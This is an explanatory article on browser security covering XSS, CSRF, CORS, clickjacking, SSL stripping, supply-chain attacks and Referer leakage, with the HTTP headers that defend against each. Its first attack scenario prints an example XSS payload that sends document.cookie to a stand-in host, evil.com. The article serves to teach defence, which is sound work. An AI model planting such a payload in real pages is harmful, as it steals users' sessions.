Browser Security: Attacks and Defenses

XSS, CSRF, clickjacking, and the HTTP headers that defend against them.

Deep dive
~14 min read
Browser security
June 2026

Browsers enforce a set of security boundaries that web applications rely on, but those boundaries can be circumvented if an application makes certain mistakes. This article covers the most common browser-targeted attacks, what makes them possible, and the combination of application-level practices and HTTP headers that defend against them. The security principles article provides the conceptual background.

Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is an injection attack where malicious JavaScript is injected to a web page trusted by other users. Once running in a victim's browser, that script has the same capabilities as any legitimate script on the page.

How it works

The "cross-site" part of the name refers to where the code comes from, not where it runs. The script is authored by the attacker, someone with no legitimate reason to run code on the site at all, but the browser ends up executing it inside the site's own origin, with the same access to cookies, the DOM, and API calls as code the site actually wrote itself.

This happens when an application takes untrusted data (from a user, a URL, a database) and outputs it into a page without escaping it. The browser then parses that data as markup and executes it.

There are three main forms, and they differ in where the unsafe step actually happens. Stored XSS is the most severe. The malicious payload is saved to the database (in a comment, a profile name, a message) and gets served to every user who views that page.

Reflected XSS also involves the server, but nothing is saved. A crafted URL carries the payload as a query parameter, the server reads that parameter and writes it straight into the HTML it sends back (a search page that echoes "You searched for: ..." is the classic case), and the browser parses it as markup because the server never escaped it. Since the server put the payload into the response, viewing the page's source shows the injected script sitting right there in the HTML. The attack still needs a victim to click the crafted link, since the payload only exists for that one request.

DOM-based XSS never touches the server at all. The HTML the server sends back is identical for every visitor, and its source shows nothing unusual. The payload lives in the URL, often after a #, which browsers never even send to the server, and it's the page's own JavaScript that reads it (with something like location.hash) and writes it into the DOM (with innerHTML or a similar sink) without escaping it. The bug is entirely in client-side code, not in anything the server rendered.

What an attacker can do once JavaScript is executing in the victim's browser:

  • Read cookies, unless HttpOnly prevents it
  • Steal tokens from localStorage
  • Make authenticated API requests as the user
  • Log every keystroke
  • Redirect to a phishing page
  • Silently modify page content

Defenses

The primary defense is output encoding. Any untrusted data inserted into HTML must be escaped so that it cannot be interpreted as markup. The characters that matter most are <, >, &, ", and ': escaped, these become &lt;, &gt;, and so on. Modern frontend frameworks (React, Vue, Angular, Svelte) escape output by default. The danger is bypassing these protections deliberately (dangerouslySetInnerHTML in React, v-html in Vue, or raw innerHTML in vanilla JavaScript) without first sanitizing the input through a trusted library like DOMPurify.

HttpOnly cookies don't prevent XSS but meaningfully limit its impact. A cookie marked HttpOnly is not accessible to JavaScript. document.cookie won't include it. This means an XSS payload cannot steal session tokens stored in HttpOnly cookies, which removes the most common goal of XSS attacks. This is why session cookies should always be HttpOnly.

Content Security Policy (CSP) is a response header that tells the browser which content sources are legitimate. It is a second line of defense. It does not fix the underlying vulnerability, but it can prevent an injected script from executing or exfiltrating data.

# Only allow scripts from the same origin, not inline scripts
Content-Security-Policy: script-src 'self'
 
# Allow scripts from self and a CDN
Content-Security-Policy: script-src 'self' https://cdn.example.com
 
# Allow specific inline scripts using a nonce
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m9x'

A nonce is a random value generated per response and added to both the CSP header and any inline <script> tags on the page. The browser only executes inline scripts whose nonce matches. An injected script has no nonce, so even if XSS occurs, the script is blocked. Nonces must be genuinely random and must change on every response. A predictable or reused nonce is no protection.

X-Content-Type-Options: nosniff prevents browsers from interpreting a response as a different content type than what the server declared. Modern browsers already enforce strict MIME type checking for script execution, so this header is defense-in-depth rather than a primary control. It still earns its place since it prevents browsers from treating downloaded files as HTML, closes content-type confusion on some less common resource types, and signals a deliberate security posture to scanning tools and intermediaries.

X-Content-Type-Options: nosniff
CSP in report-only mode

Deploying a new CSP policy can break legitimate functionality if an allowed source gets missed. Content-Security-Policy-Report-Only sends the same policy but only reports violations instead of blocking them. Pair it with a report-uri or report-to directive to collect violations in the site's logging infrastructure.

Cross-Site Request Forgery (CSRF)

CSRF exploits the browser's automatic cookie behavior to make authenticated requests on a victim's behalf, without the victim knowing.

How it works

CSRF attacks target sites whose session cookie gets attached to a request no matter where that request came from. An evil site can make a browser send a request to the vulnerable site, and it arrives with a session cookie attached. The vulnerable site's server sees a valid session and processes the request with no way to tell it didn't come from the actual account holder.

CSRF and Same-Origin Policy

CSRF only works for state-changing operations (POST, PUT, DELETE). The Same-Origin Policy prevents the attacker's page from reading the vulnerable site's response, so it can't steal data this way, only trigger an action.

Defenses

The modern defense is the SameSite cookie attribute, covered in depth in the HTTP article. With SameSite=Strict, the session cookie is never sent on a cross-site request. SameSite=Lax (the browser default since around 2020) sends the cookie only on a cross-site request that's both a top-level navigation and uses a safe method, an ordinary link click being the common case. The hidden form in the classic example above submits as a POST, which isn't a safe method, so Lax withholds the cookie there too, exactly like Strict. Either setting works by keeping the cookie from ever reaching the server. The bank sees a request with no valid session at all, forged or not.

CSRF tokens defend against the same attack as SameSite, just at a different layer, which is why sites commonly use both instead of relying on either alone. SameSite is a single point of protection. If it's ever misconfigured, disabled, unsupported by an older client, needs to be SameSite=None for a legitimate cross-origin integration, or simply doesn't apply because the request came from a same-site subdomain the application doesn't fully trust, a forged request can still arrive with the session cookie attached, and nothing about the cookie itself stops it. CSRF tokens are the independent backstop for exactly that case. The server embeds a second, unique, unpredictable value into each form or response and rejects any state-changing request that doesn't include a matching one. Even if a forged request from evilsite.com does arrive with the victim's session cookie, because SameSite failed to stop it, evilsite.com's page was never able to read bank.com's page in the first place, so it never saw the token and has no way to include it. The request still fails, on the token alone.

SameSite=Strict or Lax cookies aren't sent on a cross-site POST like this one, so the session cookie never arrives. CSRF tokens verify the request originated from a page the server rendered.

Same-Origin Policy and CORS

The same-origin policy is the browser's default-deny rule for reading across origins. CORS is how a server opts specific origins back in.

What it protects against

Browsers enforce a same-origin policy - JavaScript running on one origin cannot read the response to a request it made to a different origin. An origin is the combination of scheme, host, and port, so https://app.example.com and https://api.example.com count as different origins even though they share a domain. Without this rule, any page visited could quietly call a bank's API or a webmail API while the user happens to be logged into either, and read back whatever came out, if the session cookie's SameSite attribute is None. The inbox-reading scenario below walks through exactly that.

Why it only blocks reads, not sends

A page on evilsite.com can still make the browser send a request to mail.com. The same-origin policy was never designed to stop that. Long before JavaScript could make a request at all, a plain HTML form or an <img> tag could already trigger a cross-origin GET or POST, and the web still depends on that today for ordinary links, embedded images, and third-party forms. Blocking all cross-origin sends outright would break huge parts of the web that have nothing to do with attackers. What the policy targets instead is stopping the attacker's page from reading whatever comes back. A request that changes something on the server, with no interest in reading the response, is a different problem entirely. That's CSRF, covered above, and it's why SameSite cookies and CSRF tokens exist as a defense that has nothing to do with CORS.

CORS: opting specific origins back in

CORS is the mechanism a server uses to tell the browser a particular origin is allowed to read its responses. The header-by-header mechanics, the preflight exchange, Access-Control-Allow-Origin, credentialed requests, are covered in the HTTP article. What's worth understanding here is why preflight exists at all.

A request with a custom header, a JSON body, or a method like PUT or DELETE is something a plain HTML form could never produce. Before fetch and XHR existed, no server had a reason to check where a request like that came from, because a cross-origin script had no way to send one. Most servers still don't check the Origin header on every request. A well-written one could reject an unexpected origin itself, but CORS can't assume every server does. So the browser first sends a side-effect-free OPTIONS request, and only sends the real one if the server explicitly answers with the right Access-Control-* headers. A server that's never heard of CORS simply won't answer correctly, and the real request never goes out. That protects servers that were never written with cross-origin JavaScript in mind, without requiring them to add anything.

A common misconfiguration

Some APIs reflect back whatever Origin header a request sends as Access-Control-Allow-Origin, instead of checking it against an allowlist. Combined with Access-Control-Allow-Credentials: true, this hands read access to authenticated responses to any origin that asks, which defeats the point of the policy entirely.

XSS vs. CSRF vs. CORS

Three different boundaries, not three names for the same thing

XSS, CSRF, and CORS have similar names but are different things:

  • XSS is an injection attack that exploits a site's failure to escape untrusted input. Defenses are output encoding, HttpOnly cookies, and CSP.
  • CSRF is an attack that exploits the browser's automatic cookie attachment to forge a state-changing request. Defenses are SameSite cookies and CSRF tokens.
  • CORS is not an attack. It's a protocol that allows a server to selectively relax the same-origin policy for trusted origins.

The mix-up usually comes from CSRF and CORS both involving a second origin. The browser sends a cross-origin request whether or not CORS allows it. CORS only governs whether the response can be read, not whether the request goes out. That's why a perfectly configured CORS policy does nothing to stop a CSRF attack, and a strict CSRF defense does nothing to stop a script from reading a response it was already permitted to read. XSS doesn't involve a second origin at all. It just means the attacker's code is running with the first origin's own trust, as if the site had written it.

Clickjacking

The attacker makes the victim click something they didn't intend to, by overlaying a transparent version of the target site on top of their own page.

How it works

An attacker embeds the target site in a transparent <iframe> and positions it precisely over a button or link on their own page. The user sees the attacker's page and thinks they're clicking the attacker's button. They're actually clicking a "Confirm Transfer" button on the embedded site, while authenticated in that site's session.

Defenses

The defense is preventing pages from being embedded in iframes outside the site's control. Two mechanisms do this.

X-Frame-Options is the older header. DENY prevents embedding anywhere. SAMEORIGIN only allows embedding in iframes on the same origin.

X-Frame-Options: DENY

The CSP frame-ancestors directive is more flexible and supersedes X-Frame-Options in modern browsers. It accepts a list of permitted embedding origins.

# No embedding allowed anywhere
Content-Security-Policy: frame-ancestors 'none'
 
# Only allow embedding within the same origin
Content-Security-Policy: frame-ancestors 'self'
 
# Allow a specific trusted partner site
Content-Security-Policy: frame-ancestors 'self' https://partner.example.com

For maximum compatibility, set both X-Frame-Options: DENY (for older browsers) and frame-ancestors 'none' in CSP for modern ones.

Protocol Downgrade Attacks

HTTPS prevents eavesdropping, but only if the browser uses it. On the first visit, an attacker on the same network can intercept the initial HTTP request before HTTPS kicks in.

How it works

Modern browsers already default to HTTPS in most cases. Type a bare domain into the address bar and the browser tries HTTPS first, and most links on the modern web already point to an https:// URL. The downgrade risk that remains lives in the cases that bypass this default. A user types http:// explicitly into the address bar, or clicks a link that hardcodes the http:// scheme, perhaps an old bookmark, a link on a page that was never updated, a printed URL, or a QR code. In either case the browser's first request goes out as plain HTTP, and an attacker on the same network (a café WiFi network, for example) can intercept it before anything redirects to HTTPS.

SSL stripping is the classic form this attack takes. The attacker sits between the user and the server, intercepts that initial HTTP request, and instead of forwarding it, talks to the real server over HTTPS themselves while relaying a plain HTTP response back to the victim. The user thinks they're talking to the real site; they're actually talking to the attacker, and since the victim's own connection is HTTP, everything they send or receive is visible and modifiable. Even if the server's first response to the HTTP request is a redirect to HTTPS, that redirect still has to cross the attacker's connection first, so the attacker can simply intercept it and keep the victim on HTTP.

Defense: HSTS

HTTP Strict Transport Security (HSTS) instructs the browser to always use HTTPS for a domain (even if the user types HTTP) for a specified period. Once the browser has seen the HSTS header, it converts any HTTP request for that domain to HTTPS before sending it, bypassing any attacker in the middle.

Strict-Transport-Security: max-age=31536000; includeSubDomains

max-age is in seconds: 31536000 is one year. includeSubDomains applies the policy to all subdomains, which prevents an attacker from attacking a subdomain to compromise the main site via cookies. preload (an optional additional directive) opts the domain into browser preload lists.

The first-visit problem and preloading

HSTS solves the problem for returning visitors, but not the first visit. The browser hasn't yet received the HSTS header. The HSTS preload list is a list of domains that major browsers ship with, instructing them to always use HTTPS before the first request. Submitting to the preload list at hstspreload.org is free, but it is a significant commitment. Removing a domain takes months and requires coordination with browser vendors. Only submit if every subdomain of the domain is certain to serve HTTPS indefinitely.

Supply Chain Attacks

Loading a third-party script means trusting that it will always contain what's expected. If the CDN or the script provider is compromised, users run malicious code.

How it works

Including a script from a CDN with a plain <script src="..."> tag means whatever that URL serves, the users execute. If the CDN is breached or the script provider's account is compromised, the injected code runs with full access to the page and can steal form inputs, session data, or anything else on the page. This happened to Polyfill.io in 2024, affecting hundreds of thousands of sites that trusted a shared CDN.

Defense: Subresource Integrity

Subresource Integrity (SRI) lets a page specify the expected hash of a resource in the tag itself. The browser refuses to execute the script if its content doesn't match.

HTML 
<script
  src="https://cdn.example.com/library.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous"
></script>

The hash is generated from the exact file content at the time the tag is added. SRI only works for static, versioned assets. It cannot protect dynamically updated scripts (where the URL stays the same but the content changes), because any legitimate update would also break the hash. For dynamically updated third-party scripts, the only reliable mitigation is to self-host a pinned version and update it manually.

The npm supply chain

A CDN script tag is only one entry point. Most applications also pull in far more third-party code through npm, often hundreds of packages once transitive dependencies are counted, and none of it sits behind a browser script tag SRI can check. It gets installed on a developer's machine or a CI runner and ends up bundled directly into the production build, so the malicious code becomes part of the bundle before it ever reaches a browser. This isn't hypothetical: in 2021, an attacker compromised the maintainer account behind ua-parser-js, a package downloaded millions of times a week, and published versions containing a cryptominer and a credential stealer.

Defense: lockfiles and auditing

Committing a lockfile (package-lock.json) and installing with npm ci instead of npm install ensures every install uses the exact package versions that were already reviewed, rather than whatever a version range happens to resolve to on a given day. npm audit checks installed dependencies against a database of known-malicious and vulnerable packages, and should run in CI rather than only on a developer's machine. The same logic applies regardless of which package manager a project uses, pnpm and Yarn included.

Information Leakage

Browsers share information with third parties as a side effect of normal navigation. Two headers give servers control over what gets shared.

Referrer-Policy

When a user navigates from one page to another, or when a page loads a third-party resource, the browser sends a Referer header containing the current page's URL. This is useful for analytics, but it can also leak sensitive information if URLs contain user IDs, session tokens, or search terms. Every third-party resource on the page receives that data.

# Send only the origin (not the full URL) for cross-origin requests
Referrer-Policy: strict-origin-when-cross-origin

strict-origin-when-cross-origin is the browser default in modern browsers. It sends the full URL for same-origin requests (useful for internal analytics) and only the origin for cross-origin ones (no path, no query string). For pages that are genuinely sensitive, no-referrer sends nothing at all.

Permissions-Policy

Permissions-Policy controls which browser features a page and its embedded content can access: camera, microphone, geolocation, payment APIs, and others. A page that doesn't use the camera can declare that explicitly, which means a compromised third-party script embedded in the page cannot activate it even if it tries.

# Disable camera and microphone for this page and all iframes
Permissions-Policy: camera=(), microphone=()

An empty value () disables the feature entirely. (self) allows it for the page itself but not for embedded iframes. This header matters most for pages that embed third-party iframes or advertising. Restricting permissions limits what those third parties can do regardless of their own code.

Attack Scenarios: What Stops What

Every section above explains a mechanism on its own. Attacks are easier to reason about as stories - what the attacker is after, and the one control that stops them.

The seven scenarios below cover every attack in this article, plus a variant of CSRF that steals data through a cross-origin read rather than forging a write.

1. Stealing session tokens through an injected comment

Scenario
Malicious comment persists

A user opens a discussion thread on a forum while logged into their account. An attacker has planted a comment containing <script>fetch('evil.com/steal?c='+document.cookie)</script>, aiming to steal visitors' session cookies. The browser renders the comment as markup instead of text, so the script runs in the user's session and sends their cookie to the attacker.

What stops it
Output encoding, HttpOnly

Output encoding is the primary defense. The comment is escaped before it lands in the page, so the browser renders it as text, not markup, and nothing executes. HttpOnly is the backstop. Even if a script does run, document.cookie can't see the session cookie at all.

2. Forging a bank transfer

Scenario
Hidden auto-submit form

A user is logged into their bank at bank.com and visits evilsite.com. The attacker wants to drain the user's account, so a hidden form on the page auto-submits a POST to bank.com/transfer with the attacker's own account as the recipient.

What stops it
SameSite cookies

SameSite=Lax or Strict on the session cookie means the browser won't attach it to a cross-site POST, so bank.com sees a request with no valid session and rejects it. CSRF tokens do the same job when SameSite can't be relied on.

3. Reading someone else's inbox

Scenario
Cross-origin fetch

A user is logged into mail.com and visits evilsite.com. The attacker wants to read the user's private messages, so JavaScript on the page runs fetch('mail.com/api/inbox') and tries to read whatever comes back.

What stops it
SameSite cookies, then CORS

Two independent layers apply, and either one alone stops the theft. SameSite cookies aren't attached to cross-site fetch calls at all (unlike a top-level navigation, this is a subresource request), so mail.com may see no valid session to begin with. Even when the cookie is sent deliberately over a SameSite=None API, the same-origin policy still blocks evilsite.com's script from reading the response unless mail.com's CORS headers name evilsite.com as an allowed origin. Both layers would have to fail for the read to succeed.

4. Hijacking a click

Scenario
Transparent iframe overlay

A user, logged into bank.com, visits evilsite.com to claim an advertised prize. The attacker actually wants them to delete their bank account, so bank.com's "Delete Account" page loads in a transparent iframe positioned exactly over the "Claim your prize" button. The user clicks the button and unknowingly clicks Delete Account instead.

What stops it
frame-ancestors

frame-ancestors (or the older X-Frame-Options) tells the browser bank.com may not be framed by evilsite.com at all. The iframe never loads, so there's nothing to overlay.

5. Stripping HTTPS on public WiFi

Scenario
SSL stripping

A user connects to bank.com over café WiFi. The attacker wants to read and alter the user's traffic, including their login credentials, so they intercept the first plain-HTTP request, talk to the real bank.com over HTTPS themselves, and relay an unencrypted version back to the victim.

What stops it
HSTS

Once the browser has seen bank.com's Strict-Transport-Security header, or finds the domain on the preload list, it rewrites every request to HTTPS before anything leaves the machine. There's no plaintext request left for the attacker to intercept.

6. A compromised CDN script

Scenario
Breached dependency

A user checks out on an online store that loads its charting library from a shared CDN. The attacker wants the payment details entered on that checkout page, so once the CDN is breached, the injected code runs with full page access on every site that includes the script, this one included.

What stops it
Subresource Integrity

The browser hashes the file before executing it and compares that hash to the one pinned in the integrity attribute when the tag was added. A modified file doesn't match, and the browser refuses to run it.

7. Leaking a password reset link to an ad network

Scenario
Referer leakage

A user requests a password reset and clicks the emailed link, landing on bank.com/reset?token=abc123, a page that also loads a third-party analytics script. The attacker wants that token, since it can take over the account, and by default the browser hands over the full URL, token included, in the Referer header of every request the script makes.

What stops it
Referrer-Policy

strict-origin-when-cross-origin sends only the origin, no path or query string, to cross-origin requests. no-referrer, for the most sensitive pages, sends nothing at all. Either way, the token never leaves bank.com.
